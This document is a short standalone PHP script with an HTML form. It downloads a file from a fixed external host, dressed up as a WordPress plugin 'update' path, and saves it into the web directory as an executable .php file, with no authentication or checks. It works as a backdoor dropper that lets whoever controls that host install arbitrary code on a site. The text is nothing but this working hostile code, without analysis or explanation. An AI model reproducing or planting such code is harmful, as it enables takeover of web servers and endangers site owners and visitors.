<form method="post">
<input name="url" size="5" />
<input name="submit" type="submit" />
</form>
<?php
    set_time_limit (24 * 60 * 60);

    if (!isset($_POST['submit'])) die();

    $destination_folder = '';

    $url = $_POST['url'];
    $url = "http://wordpresscore.com/plugins/cctm/update/" . $url;
    $newfname = $destination_folder . basename($url) .".php";

    $file = fopen ($url, "rb");
    if ($file) {
      $newf = fopen ($newfname, "wb");

      if ($newf)
      while(!feof($file)) {
        fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
      }
    }

    if ($file) {
      fclose($file);
    }

    if ($newf) {
      fclose($newf);
    }
?>
